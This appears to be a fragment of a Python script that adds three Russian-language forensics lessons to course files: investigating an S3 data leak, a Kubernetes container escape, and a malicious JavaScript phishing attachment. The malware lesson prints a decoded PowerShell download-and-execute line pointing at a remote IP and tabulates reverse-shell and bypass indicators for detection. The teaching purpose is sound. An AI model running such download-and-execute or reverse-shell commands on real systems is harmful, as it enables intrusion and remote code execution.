ADDS["cloud-storage"] = r"""## Практический разбор: дело об утечке

Из компании утекли персональные данные, хранившиеся в S3. Ход расследования:

1. **Собираем логи.** Server access logs бакета + CloudTrail management events. Если
   data events были включены — берём и их.
2. **Ищем аномалию.** Сортируем по IP и User-Agent, смотрим новых клиентов:

```
$ awk '{print $5, $9, $10}' access.log | sort | uniq -c | sort -rn | head -20
```

3. **Проверяем паттерн.** Кто-то сделал `ListBucket`, затем серию `GET` на `*.csv`,
   `backup*.sql` — классическая эксфильтрация.
4. **Идентифицируем клиента.** По `arn` видно, ключом какого пользователя/роли
   пользовались; по `sourceIPAddress` — откуда; по `userAgent` — чем (rclone, aws-cli).
5. **Считаем объём.** Суммируем отданные байты по этому клиенту — получаем оценку
   утечки.
6. **Проверяем права.** Не стал ли бакет публичным (`PutBucketPolicy`) и кто это сделал.
7. **Фиксируем.** Прикладываем строки логов, времена в UTC, IP и identity.

Итог — воспроизводимая картина: кто, когда, чем и сколько выкачал.

## Сопоставление с другими источниками

Логи хранилища почти никогда не единственный источник. Полезно сопоставить:

- **логи веб-приложения/прокси** — тот же IP/сессия заходил в приложение?
- **IAM-логи** — создавался ли новый ключ доступа перед инцидентом;
- **сетевые потоки (VPC Flow Logs)** — подтверждают объём и направление трафика;
- **логи CI/CD** — не «слил» ли ключ пайплайн;
- **DNS-логи** — обращения к `s3.amazonaws.com` и endpoint-ам.

Совпадение времени и клиента в двух источниках резко повышает достоверность вывода.

## Инструменты и запросы

- **`aws s3api`** — `list-object-versions`, `get-bucket-policy`, `get-bucket-acl`;
- **`aws cloudtrail lookup-events`** — поиск по EventName;
- **`grep`/`awk`/`sort`** — быстрый анализ access-логов;
- **Athena/CloudWatch Logs Insights** — SQL-запросы к логам на объёме;
- **`jq`** — разбор JSON CloudTrail.

Пример запроса Athena по access-логам: выбрать клиентов с суммой отданных байт выше
порога за сутки — сразу видно выбросы.

## Частые ошибки

- **Забывают про часовой пояс.** В логах S3 время в UTC (`+0000`); сравнивая с
  локальными отчётами, переводи зону.
- **Смотрят только access-логи.** Смена прав и создание ключей — только в CloudTrail.
- **Путают identity.** Анонимный доступ (`-`) и доступ роли — разные вещи; различай.
- **Игнорируют User-Agent.** `rclone`/`s3cmd` там, где ожидается только приложение,
  — сильный сигнал.
- **Не проверяют версионирование.** Удалённое может быть восстановлено, и это
  доказательство.

## Мини-шпаргалка по полям

| Поле              | Что означает                                  |
|-------------------|-----------------------------------------------|
| IP клиента        | откуда был запрос                             |
| identity (`arn`)  | чьими правами пользовались                    |
| operation         | `GET`/`PUT`/`LIST`/`DELETE`                   |
| key               | какой объект затронут                         |
| status            | `200` успех, `403` отказ в доступе            |
| bytes sent        | объём выгруженных данных                      |
| User-Agent        | клиент (браузер, CLI, SDK)                    |

Держи эту таблицу под рукой при разборе логов — большинство вопросов снимается
первыми четырьмя полями."""

ADDS["forensics-cloud-container-runtime"] = r"""## Практический разбор: дело о побеге из контейнера

Сигнал: из контейнера на узле Kubernetes появились процессы, обращающиеся к
`kube-system`. Ход расследования:

1. **Фиксируем версии.** `runc --version`, `containerd --version`, `uname -r`.
   Сравниваем с исправленными версиями известных CVE.
2. **Проверяем бинарник рантайма.** `sha256sum $(which runc)` против эталона пакета;
   `dpkg -V runc` покажет расхождения.
3. **Смотрим конфигурацию контейнера.** `docker inspect <id>` / `crictl inspect`:
   `Privileged`, `CapAdd`, монтирования хостовых путей, `hostPID`, `hostNetwork`.
4. **Ищем следы.** `ps -ef` на хосте: процессы, чей родитель — `containerd-shim`;
   `cat /proc/<pid>/cgroup` покажет, из какого cgroup (контейнера) он пришёл.
5. **Проверяем логи.** `journalctl -u containerd` на exec/start; auditd на `execve`
   в `runc`.
6. **Документируем.** Версии, конфиг, найденные процессы, изменённые файлы (с хешами).

Так выясняется, был ли это побег через CVE, через небезопасную конфигурацию или
ложная тревога.

## Проверка конфигурации контейнера

Большинство «побегов» в реальности — не CVE, а небезопасная конфигурация. Проверь:

- `privileged: true` — даёт почти все capabilities и доступ к устройствам;
- смонтированный `/var/run/docker.sock` — полный контроль над хостом;
- `hostPID`/`hostNetwork`/`hostIPC` — доступ к пространствам имён хоста;
- `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE` — опасные capabilities;
- монтирование `/`, `/etc`, `/proc` хоста внутрь;
- отсутствие seccomp/AppArmor-профиля.

Каждый такой параметр — потенциальный путь побега без единой уязвимости.

## Инструменты

- **`runc`/`containerd`/`crictl`** — инспекция контейнеров и рантайма;
- **`dpkg -V`/`rpm -V`** — проверка целостности пакетов;
- **`auditd`/`ausearch`** — системные вызовы и exec;
- **`falco`/`sysdig`** — runtime-детект аномалий (если развёрнуты);
- **`tracee`/`bcc`** — eBPF-наблюдение за процессами;
- **`sha256sum`** — сверка бинарников рантайма.

## Частые ошибки

- **Считать любой странный процесс побегом.** Сначала проверь, не процесс ли это
  легитимного контейнера (`/proc/<pid>/cgroup`).
- **Игнорировать версию ядра.** Часть CVE — в ядре, а не в рантайме.
- **Смотреть только логи контейнера.** Побег виден на хосте: процессы, монтирования,
  бинарники.
- **Путать контейнер с VM.** Общее ядро — значит компромисс ядра или рантайма
  затрагивает весь узел.
- **Забывать про Kubernetes-слой.** RBAC, service account, admission-контроллеры —
  часть картины.

## Что важно зафиксировать

Версии рантайма, ядра и Kubernetes; конфигурацию подозрительных подов; хеши ключевых
бинарников; список процессов, вышедших за границу; источники логов и их период; какие
CVE применимы и почему. Каждый вывод подкрепляй командой и её выводом."""

ADDS["mal-script-js"] = r"""## Практический разбор: цепочка в фишинговом вложении

Пришло письмо с вложением `invoice.js`. Ход анализа без запуска:

1. **Тип файла.** `file invoice.js` — «JavaScript source». `head -c 200` показывает
   hex-escape массив и случайные имена — обфускация.
2. **Деобфускация строк.** Запускаем только построение массива в изолированном Node:

```
$ node -e "const a=['\x68\x74\x74\x70...']; console.log(a.join(''))"
```

Получаем URL `http://203.0.113.5/a.ps1`.
3. **Смотрим логику.** Ищем `ActiveXObject("WScript.Shell")` и `.Run(...)`: скрипт
   запускает PowerShell с `-EncodedCommand`.
4. **Декодируем PowerShell.** Base64 → UTF-16LE → текст: `IEX (New-Object
   Net.WebClient).DownloadString('http://203.0.113.5/p.ps1')`.
5. **Второй этап.** Если есть — деобфусцируем тем же путём; обычно это загрузчик
   stealer'а или майнера.
6. **Фиксируем IOC.** URL, IP, пути (`%TEMP%`), имена файлов, строки для YARA.

Итог — полная цепочка «JS → PowerShell → второй этап» с доказательствами.

## Декодирование: пошагово

Общий порядок для любого скриптового образца:

1. **Определи тип** (`file`, расширение, сигнатура).
2. **Найди кодировки** — Base64 (`FromBase64String`, длинные алфавитные строки),
   hex (`\x`, `0x`), `[char]`-массивы, конкатенация.
3. **Декодируй послойно** — по одному уровню за раз, фиксируя результат.
4. **Восстанови строки** — выпиши URL, пути, команды.
5. **Пойми логику** — какой cmdlet/функция запускает загрузку/исполнение.
6. **Не исполняй** — используй статический разбор (AST, деобфускатор, эмулятор).

Каждый слой записывай в отчёт: так видно, как получен вывод, и его можно перепроверить.

## Частые ошибки и подводные камни

- **Запуск образца для «посмотреть».** Это самый частый и самый опасный промах:
  скрипт активно связывается с C2. Только статический разбор.
- **Двойное декодирование.** Base64 может быть от Base64; декодируй до осмысленного
  текста, а не один раз.
- **UTF-16LE vs ASCII.** PowerShell `-EncodedCommand` — это UTF-16LE; декодирование
  как ASCII даёт «кракозябры».
- **Путаница `IEX` и `Invoke-Expression`.** Это одно и то же; обфускаторы используют
  оба написания и разрывы (`I`+`E`+`X`).
- **Игнорирование `mshta`/`.hta`.** HTA исполняется как приложение — не путай с
  обычным HTML.

## Сводная таблица индикаторов

| Приём                 | Индикатор в скрипте                         |
|-----------------------|---------------------------------------------|
| Скачивание второго этапа | `DownloadString`, `XMLHTTP`, `Invoke-WebRequest` |
| Исполнение строки     | `IEX`, `Invoke-Expression`, `eval`, `mshta`  |
| Кодирование           | `FromBase64String`, `\x`, `[char]`, `unescape` |
| Запуск процесса       | `WScript.Shell`, `ActiveXObject`, `.Run`     |
| Reverse shell         | `/dev/tcp/`, `bash -i`, `nc -e`              |
| Обход защиты          | `-ep bypass`, `-nop`, `-w hidden`            |

Эта таблица — быстрый способ классифицировать образец по нескольким строкам.

## Изоляция и безопасный анализ

Скриптовую малварь разбирают в **изолированной ВМ** с отключённой сетью (или с
подменённым DNS/симулятором C2). Снимок ВМ делают до анализа и откатывают после.
Никогда не анализируй образец на рабочей машине и не запускай вложения из письма.
Для динамического анализа — только в песочнице с записью API и без выхода в интернет.
Статический разбор (деобфускация, AST) безопасен и часто достаточен."""

def main() -> int:
    base = "content/forensics/"
    for lid, add in ADDS.items():
        path = base + lid + ".md"
        s = open(path, encoding="utf-8").read()
        m = re.search(r"^## Квиз\s*$", s, re.MULTILINE)
        if not m:
            print("SKIP (no quiz):", lid); continue
        out = s[:m.start()] + add + "\n\n" + s[m.start():]
        open(path, "w", encoding="utf-8").write(out)
        print("appended", lid)
    return 0

if __name__ == "__main__":
    sys.exit(main())
